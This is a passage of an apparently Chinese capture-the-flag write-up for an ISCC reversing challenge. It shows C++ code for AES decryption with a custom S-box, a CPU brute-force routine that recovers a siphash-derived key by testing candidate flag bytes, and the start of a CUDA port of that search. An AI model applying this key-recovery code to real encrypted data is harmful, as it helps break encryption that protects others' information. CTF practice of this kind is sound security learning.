class="number">0x29</span>, <span class="number">0x28</span>, <span class="number">0x24</span>, <span class="number">0xC9</span>, <span class="number">0x36</span>, <span class="number">0xA5</span>, <span class="number">0x69</span>, <span class="number">0xC5</span>, <span class="number">0x45</span>, <span class="number">0x08</span>, <span class="number">0xDE</span>, <span class="number">0x9F</span>, <span class="number">0x55</span>, <span class="number">0xF1</span>, <span class="number">0xA2</span>, <span class="number">0xFD</span>, <span class="number">0xCF</span>, <span class="number">0xF4</span>, <span class="number">0xE2</span>, <span class="number">0xCA</span>, <span class="number">0x0A</span>, <span class="number">0xF6</span>, <span class="number">0xB8</span>, <span class="number">0x2D</span>, <span class="number">0x8D</span>, <span class="number">0x15</span>, <span class="number">0x63</span>, <span class="number">0x6A</span>, <span class="number">0xEE</span>, <span class="number">0x1C</span>, <span class="number">0x22</span>, <span class="number">0xBD</span>, <span class="number">0xA1</span>, <span class="number">0x98</span>, <span class="number">0xB9</span>, <span class="number">0x0B</span>, <span class="number">0xAA</span>, <span class="number">0x73</span>, <span class="number">0x7E</span>, <span class="number">0x99</span>, <span class="number">0x52</span>, <span class="number">0xAE</span>, <span class="number">0x5A</span>, <span class="number">0x38</span>, <span class="number">0x1A</span>, <span class="number">0x57</span>, <span class="number">0xB1</span>, <span class="number">0x8C</span>, <span class="number">0x9C</span>, <span class="number">0x19</span>, <span class="number">0x5F</span>, <span class="number">0x66</span>, <span class="number">0x34</span>, <span class="number">0x64</span>, <span class="number">0x51</span>, <span class="number">0x17</span>, <span class="number">0x81</span>, <span class="number">0xDA</span>, <span class="number">0xBF</span>, <span class="number">0x8E</span>, <span class="number">0x3A</span>, <span class="number">0x97</span>, <span class="number">0x54</span>, <span class="number">0x3B</span>, <span class="number">0x68</span>, <span class="number">0x70</span>, <span class="number">0xB0</span>, <span class="number">0xEC</span>, <span class="number">0xB6</span>, <span class="number">0xA0</span>, <span class="number">0xFC</span>, <span class="number">0x35</span>, <span class="number">0xAB</span>, <span class="number">0xE3</span>, <span class="number">0x31</span>, <span class="number">0x18</span>, <span class="number">0x14</span>, <span class="number">0x95</span>, <span class="number">0xAC</span>, <span class="number">0x40</span>, <span class="number">0x65</span>, <span class="number">0xA4</span>, <span class="number">0xE7</span>, <span class="number">0x67</span>, <span class="number">0xE1</span>, <span class="number">0xBE</span>, <span class="number">0xC6</span>, <span class="number">0xCB</span>, <span class="number">0xD7</span>, <span class="number">0xCE</span>, <span class="number">0x6B</span>, <span class="number">0xF7</span>, <span class="number">0xA6</span>, <span class="number">0xF3</span>, <span class="number">0x6C</span>, <span class="number">0x11</span>, <span class="number">0x6F</span>, <span class="number">0x92</span>, <span class="number">0x25</span>, <span class="number">0x9E</span>, <span class="number">0x44</span>, <span class="number">0x93</span>, <span class="number">0x2E</span>, <span class="number">0x06</span>, <span class="number">0x88</span>, <span class="number">0x20</span>, <span class="number">0xED</span>, <span class="number">0x85</span>, <span class="number">0xF5</span>, <span class="number">0xB4</span>, <span class="number">0xCC</span>, <span class="number">0xC7</span>, <span class="number">0xE6</span>, <span class="number">0xC2</span>, <span class="number">0x0E</span>, <span class="number">0x02</span>, <span class="number">0x86</span>, <span class="number">0xE8</span>, <span class="number">0x46</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">aesDecrypt</span><span class="params">(<span class="type">const</span> <span class="type">uint8_t</span> *key, <span class="type">uint32_t</span> keyLen, <span class="type">const</span> <span class="type">uint8_t</span> *ct, <span class="type">uint8_t</span> *pt, <span class="type">uint32_t</span> len)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    AesKey aesKey;</span><br><span class="line">    <span class="type">uint8_t</span> *pos = pt;</span><br><span class="line">    <span class="type">const</span> <span class="type">uint32_t</span> *rk = aesKey.dK;</span><br><span class="line">    <span class="type">uint8_t</span> out[BLOCKSIZE] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">uint8_t</span> actualKey[<span class="number">16</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">uint8_t</span> state[<span class="number">4</span>][<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(actualKey, key, keyLen);</span><br><span class="line">    <span class="built_in">keyExpansion</span>(actualKey, <span class="number">16</span>, &amp;aesKey);</span><br><span class="line">   </span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i += BLOCKSIZE) &#123;</span><br><span class="line">        <span class="built_in">loadStateArray</span>(state, ct);</span><br><span class="line">        <span class="built_in">addRoundKey</span>(state, rk);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt; <span class="number">10</span>; ++j) &#123;</span><br><span class="line">            rk += <span class="number">4</span>;</span><br><span class="line">            <span class="built_in">invShiftRows</span>(state);</span><br><span class="line">            <span class="built_in">invSubBytes</span>(state);</span><br><span class="line">            <span class="comment">// 解密交换addRoundKey和invMixColumns的调用顺序</span></span><br><span class="line">            <span class="built_in">invMixColumns</span>(state);</span><br><span class="line">            <span class="built_in">addRoundKey</span>(state, rk);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">invSubBytes</span>(state);</span><br><span class="line">        <span class="built_in">invShiftRows</span>(state);</span><br><span class="line">        <span class="built_in">addRoundKey</span>(state, rk<span class="number">+4</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">storeStateArray</span>(state, pos);</span><br><span class="line">        pos += BLOCKSIZE;</span><br><span class="line">        ct += BLOCKSIZE;</span><br><span class="line">        rk = aesKey.dK;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="CPU爆破样板代码"><a href="#CPU爆破样板代码" class="headerlink" title="CPU爆破样板代码"></a>CPU爆破样板代码</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">Crack</span><span class="params">(<span class="type">uint8_t</span>* KeyOut)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 密文</span></span><br><span class="line"><span class="type">uint8_t</span> enc1[<span class="number">48</span>]&#123;<span class="number">0x9f</span>, <span class="number">0xb3</span>, <span class="number">0xb8</span>, <span class="number">0x2f</span>, <span class="number">0x23</span>, <span class="number">0x82</span>, <span class="number">0x19</span>, <span class="number">0x7d</span>, <span class="number">0xe7</span>, <span class="number">0x2a</span>, <span class="number">0x8b</span>, <span class="number">0x20</span>, <span class="number">0x0c</span>, <span class="number">0x5b</span>, <span class="number">0x79</span>, <span class="number">0x72</span>, <span class="number">0xf7</span>, <span class="number">0x07</span>, <span class="number">0xa0</span>, <span class="number">0x63</span>, <span class="number">0x53</span>, <span class="number">0x99</span>, <span class="number">0x49</span>, <span class="number">0xc2</span>, <span class="number">0x51</span>, <span class="number">0xde</span>, <span class="number">0x86</span>, <span class="number">0x1b</span>, <span class="number">0x87</span>, <span class="number">0x2f</span>, <span class="number">0x31</span>, <span class="number">0x6b</span>, <span class="number">0xbc</span>, <span class="number">0xfa</span>, <span class="number">0x5b</span>, <span class="number">0x9a</span>, <span class="number">0x6b</span>, <span class="number">0x12</span>, <span class="number">0x16</span>, <span class="number">0x8b</span>, <span class="number">0x31</span>, <span class="number">0xf6</span>, <span class="number">0x6c</span>, <span class="number">0x1d</span>, <span class="number">0x94</span>, <span class="number">0xba</span>, <span class="number">0x2f</span>, <span class="number">0x37</span> &#125;;</span><br><span class="line">    <span class="comment">// 解密明文</span></span><br><span class="line"><span class="type">uint8_t</span> out[<span class="number">16</span>]&#123;&#125;;</span><br><span class="line">    <span class="comment">// 爆破三个字节全排列</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> c1 = <span class="number">32</span>; c1 &lt; <span class="number">127</span>; c1++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> c2 = <span class="number">32</span>; c2 &lt; <span class="number">127</span>; c2++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> c3 = <span class="number">32</span>; c3 &lt; <span class="number">127</span>; c3++)</span><br><span class="line">&#123;</span><br><span class="line">                <span class="comment">// 爆破16个01的全排列</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> rnd_v = <span class="number">0</span>; rnd_v &lt; <span class="number">0xffff</span>; rnd_v++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">uint8_t</span> rndList[<span class="number">16</span>]&#123; &#125;;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">rndList[i] = i;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">rndList[i] += (rnd_v &gt;&gt; (<span class="number">15</span>-i)) &amp; <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// 组合目标hash字符串</span></span><br><span class="line"><span class="type">uint8_t</span> hash_plaintext[] = <span class="string">&quot;ISCC&#123;xxx&#125;&quot;</span>;</span><br><span class="line">hash_plaintext[<span class="number">5</span>] = c1;</span><br><span class="line">hash_plaintext[<span class="number">6</span>] = c2;</span><br><span class="line">hash_plaintext[<span class="number">7</span>] = c3;</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> hash = <span class="built_in">siphash24</span>(hash_plaintext, <span class="number">9</span>, (<span class="type">const</span> <span class="type">char</span>*)rndList);</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// 扩展生成Key</span></span><br><span class="line"><span class="type">uint8_t</span> key[<span class="number">16</span>]&#123;&#125;;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">key[i] = (<span class="type">uint8_t</span>)(hash &gt;&gt; (i * <span class="number">8</span> &amp; <span class="number">0x3f</span>));</span><br><span class="line">key[i * <span class="number">2</span> + <span class="number">1</span>] = (<span class="type">uint8_t</span>)(hash &gt;&gt; (i * <span class="number">-8</span> + <span class="number">0x38</span> &amp; <span class="number">0x3f</span>));</span><br><span class="line">&#125;</span><br><span class="line">                    <span class="comment">// 仅解密前16字节用于校验Key</span></span><br><span class="line"><span class="built_in">aesDecrypt</span>(key, <span class="number">16</span>, enc1, out, <span class="number">16</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (out[<span class="number">0</span>] == <span class="string">&#x27;I&#x27;</span> &amp;&amp; out[<span class="number">1</span>] == <span class="string">&#x27;S&#x27;</span> &amp;&amp; out[<span class="number">2</span>] == <span class="string">&#x27;C&#x27;</span> &amp;&amp; out[<span class="number">3</span>] == <span class="string">&#x27;C&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">memcpy</span>(KeyOut, key, <span class="number">16</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%x &quot;</span>, key[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="CPU爆破代码转CUDA爆破代码"><a href="#CPU爆破代码转CUDA爆破代码" class="headerlink" title="CPU爆破代码转CUDA爆破代码"></a>CPU爆破代码转CUDA爆破代码</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;cuda_runtime.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;device_launch_parameters.h&quot;</span></span></span><br><span class="line"><span class="comment">// 密文</span></span><br><span class="line">__constant__ <span class="type">uint8_t</span> EncFlag[<span class="number">48</span>];</span><br><span class="line"><span class="comment">// 逆sbox</span></span><br><span class="line">__constant__ <span class="type">uint8_t</span> inv_S[<span class="number">256</span>];</span><br><span class="line"><span class="comment">// sbox</span></span><br><span class="line">__constant__ <span class="type">uint8_t</span> S[<span class="number">256</span>];</span><br><span class="line"><span class="comment">// 轮常量</span></span><br><span class="line">__constant__ <span class="type">uint32_t</span> rcon[<span class="number">10</span>];</span><br><span class="line"><span class="comment">// hash明文模板</span></span><br><span class="line">__constant__ <span class="type">uint8_t</span> hash_plaintext_template[<span class="number">10</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">uint8_t</span> inv_S_user[<span class="number">256</span>] &#123; </span><br><span class="line"><span class="number">0xD1</span>, <span class="number">0x41</span>, <span class="number">0x09</span>, <span class="number">0xF9</span>, <span class="number">0x3F</span>, <span class="number">0x56</span>, <span class="number">0xFF</span>, <span class="number">0xCD</span>, <span class="number">0x1F</span>, <span class="number">0x91</span>, <span class="number">0xFB</span>, <span class="number">0xD4</span>, <span class="number">0x94</span>, <span class="number">0x27</span>, <span class="number">0xDC</span>, <span class="number">0xBB</span>,</span><br><span class="line"><span class="number">0x5B</span>, <span class="number">0xA9</span>, <span class="number">0xFA</span>, <span class="number">0xEA</span>, <span class="number">0xEF</span>, <span class="number">0x47</span>, <span class="number">0xA8</span>, <span class="number">0x6D</span>, <span class="number">0x32</span>, <span class="number">0xE4</span>, <span class="number">0x4D</span>, <span class="number">0xDF</span>, <span class="number">0xB2</span>, <span class="number">0xD6</span>, <span class="number">0x01</span>, <span class="number">0x8A</span>,</span><br><span class="line"><span class="number">0x07</span>, <span class="number">0x79</span>, <span class="number">0x21</span>, <span class="number">0x12</span>, <span class="number">0x4B</span>, <span class="number">0xC8</span>, <span class="number">0xD2</span>, <span class="number">0x77</span>, <span class="number">0xFE</span>, <span class="number">0x10</span>, <span class="number">0x13</span>, <span class="number">0x5C</span>, <span class="number">0x7B</span>, <span class="number">0xF8</span>, <span class="number">0x43</span>, <span class="number">0x37</span>,</span><br><span class="line"><span class="number">0x4F</span>, <span class="number">0x59</span>, <span class="number">0x26</span>, <span class="number">0xC4</span>, <span class="number">0xF0</span>, <span class="number">0xC3</span>, <span class="number">0x3C</span>, <span class="number">0x3D</span>, <span class="number">0xD9</span>, <span class="number">0xC0</span>, <span class="number">0x16</span>, <span class="number">0xA3</span>, <span class="number">0x87</span>, <span class="number">0x03</span>, <span class="number">0xD5</span>, <span class="number">0x00</span>,</span><br><span class="line"><span class="number">0xAD</span>, <span class="number">0x23</span>, <span class="number">0x0F</span>, <span class="number">0x5E</span>, <span class="number">0x7F</span>, <span class="number">0x89</span>, <span class="number">0x2A</span>, <span class="number">0x82</span>, <span class="number">0x84</span>, <span class="number">0x30</span>, <span class="number">0x78</span>, <span class="number">0x83</span>, <span class="number">0xEB</span>, <span class="number">0xBA</span>, <span class="number">0x72</span>, <span class="number">0xB7</span>,</span><br><span class="line"><span class="number">0xC1</span>, <span class="number">0x05</span>, <span class="number">0x58</span>, <span class="number">0x90</span>, <span class="number">0x0C</span>, <span class="number">0x39</span>, <span class="number">0x50</span>, <span class="number">0x7C</span>, <span class="number">0xD8</span>, <span class="number">0xDD</span>, <span class="number">0x42</span>, <span class="number">0x8B</span>, <span class="number">0x1E</span>, <span class="number">0x4A</span>, <span class="number">0x2C</span>, <span class="number">0x6E</span>,</span><br><span class="line"><span class="number">0xE9</span>, <span class="number">0x96</span>, <span class="number">0x60</span>, <span class="number">0x75</span>, <span class="number">0x49</span>, <span class="number">0xAF</span>, <span class="number">0x3E</span>, <span class="number">0x2F</span>, <span class="number">0x04</span>, <span class="number">0x9A</span>, <span class="number">0xBC</span>, <span class="number">0xD3</span>, <span class="number">0x48</span>, <span class="number">0x71</span>, <span class="number">0x0D</span>, <span class="number">0x5D</span>,</span><br><span class="line"><span class="number">0x2B</span>, <span class="number">0x7A</span>, <span class="number">0x4C</span>, <span class="number">0x53</span>, <span class="number">0x1D</span>, <span class="number">0x4E</span>, <span class="number">0x33</span>, <span class="number">0xD0</span>, <span class="number">0xDB</span>, <span class="number">0x8F</span>, <span class="number">0xB3</span>, <span class="number">0x62</span>, <span class="number">0x61</span>, <span class="number">0x7D</span>, <span class="number">0xE5</span>, <span class="number">0x9D</span>,</span><br><span class="line"><span class="number">0xF2</span>, <span class="number">0x9B</span>, <span class="number">0x76</span>, <span class="number">0x74</span>, <span class="number">0x1B</span>, <span class="number">0x80</span>, <span class="number">0xA7</span>, <span class="number">0xB5</span>, <span class="number">0xE0</span>, <span class="number">0x29</span>, <span class="number">0x28</span>, <span class="number">0x24</span>, <span class="number">0xC9</span>, <span class="number">0x36</span>, <span class="number">0xA5</span>, <span class="number">0x69</span>,</span><br><span class="line"><span class="number">0xC5</span>, <span class="number">0x45</span>, <span class="number">0x08</span>, <span class="number">0xDE</span>, <span class="number">0x9F</span>, <span class="number">0x55</span>, <span 